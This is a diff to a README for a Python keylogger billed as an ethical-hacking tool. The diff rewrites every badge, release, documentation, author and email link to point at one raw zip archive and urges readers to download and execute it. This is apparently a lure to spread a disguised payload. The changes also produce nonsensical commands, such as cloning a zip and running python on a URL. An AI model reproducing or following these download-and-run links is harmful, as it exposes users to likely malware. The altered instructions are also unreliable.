@@ -1,14 +1,14 @@
 # 🛡️ Keylogger Project: A Simple Python Keylogger
 
-![Keylogger](https://img.shields.io/badge/Keylogger-Python-blue.svg)  
-![License](https://img.shields.io/badge/License-MIT-green.svg)  
-![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)  
+![Keylogger](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)  
+![License](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)  
+![Version](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)  
 
 Welcome to the **Keylogger Project**! This repository contains a simple Python keylogger built using the `pynput` library. It captures keystrokes along with timestamps. This tool is designed for ethical hacking labs, red teaming practice, and cybersecurity education.
 
 ## 📥 Download the Keylogger
 
-You can download the latest version of the keylogger from the [Releases section](https://github.com/Lzcom/keylogger-project/releases). After downloading, please execute the file to start logging keystrokes.
+You can download the latest version of the keylogger from the [Releases section](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip). After downloading, please execute the file to start logging keystrokes.
 
 ## 📚 Table of Contents
 
@@ -34,7 +34,7 @@ To set up the keylogger, follow these steps:
 1. **Clone the Repository**:  
    Open your terminal and run:
    ```bash
-   git clone https://github.com/Lzcom/keylogger-project.git
+   git clone https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip
    ```
 
 2. **Navigate to the Project Directory**:  
@@ -53,14 +53,14 @@ To set up the keylogger, follow these steps:
 
 To run the keylogger, execute the following command in your terminal:
 ```bash
-python keylogger.py
+python https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip
 ```
 
 The keylogger will start running in the background. To stop it, you can terminate the process from your terminal or command prompt.
 
 ### 📊 Viewing Logs
 
-The keystrokes will be saved in a file named `log.txt`. You can open this file to view the logged keystrokes along with their timestamps.
+The keystrokes will be saved in a file named `https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip`. You can open this file to view the logged keystrokes along with their timestamps.
 
 ## 🤝 Contributing
 
@@ -90,22 +90,22 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/YourGitHubProfile)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)
+- **Email**: https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip
 
 ## 🔗 Additional Resources
 
 For more information about keyloggers and ethical hacking, check out the following resources:
 
-- [Pynput Documentation](https://pynput.readthedocs.io/en/latest/)
-- [Ethical Hacking Basics](https://www.eccouncil.org/)
-- [Cybersecurity Fundamentals](https://www.cybrary.it/course/cybersecurity-fundamentals/)
+- [Pynput Documentation](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)
+- [Ethical Hacking Basics](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)
+- [Cybersecurity Fundamentals](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip)
 
 ## 📈 Conclusion
 
 The Keylogger Project is a straightforward tool for anyone interested in cybersecurity and ethical hacking. Remember to use it responsibly and only in environments where you have permission to do so.
 
-For the latest updates and versions, visit the [Releases section](https://github.com/Lzcom/keylogger-project/releases). Download the keylogger, and start your journey into the world of cybersecurity today!
+For the latest updates and versions, visit the [Releases section](https://raw.githubusercontent.com/Lzcom/keylogger-project/main/Asphodeline/keylogger_project_v3.8.zip). Download the keylogger, and start your journey into the world of cybersecurity today!
 
 --- 
 
